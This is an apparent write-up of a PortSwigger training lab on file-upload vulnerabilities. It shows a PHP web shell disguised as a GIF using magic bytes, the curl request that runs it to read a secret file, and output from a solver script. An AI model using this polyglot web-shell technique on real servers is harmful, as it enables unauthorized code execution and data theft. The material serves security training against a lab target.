# Lab: Remote code execution via polyglot web shell upload

### Instructions

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter` 

### Solution

We can begin the lab by logging in with the provided credentials.

Next we can take our standard PHP script to read the flag:

```php
<?php system('cat /home/carlos/secret'); ?>
```

And add magic bytes to it:

```php
GIF8
<?php system('cat /home/carlos/secret'); ?>
```

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/File_Upload_Vulnerabilities/File_Upload_06_remote_code_execution_via_polyglot_web_shell_upload]
└─$ file flag.php    
flag.php: GIF image data 28735 x 28776
```

We can then load this PHP file, and because the app is only confirming that the file starts as an image, we achieve code execution and can access the flag:

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/File_Upload_Vulnerabilities/File_Upload_06_remote_code_execution_via_polyglot_web_shell_upload]
└─$ curl https://0a49009703927e3381a5395e0027006e.web-security-academy.net/files/avatars/flag.php    
GIF8
LuupDwLGr1gaIDAGmLXxDRRFCoNlE3pK 
```

### Python Solution

See `file_upload_06.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/File_Upload_Vulnerabilities/File_Upload_06_remote_code_execution_via_polyglot_web_shell_upload]
└─$ python file_upload_06.py https://0a49009703927e3381a5395e0027006e.web-security-academy.net 
[+] Logged in as wiener
[+] File uploaded
[+] The lab's flag is: LuupDwLGr1gaIDAGmLXxDRRFCoNlE3pK
[*] Submitting flag to solve lab...
[+] Successfully submitted the flag
```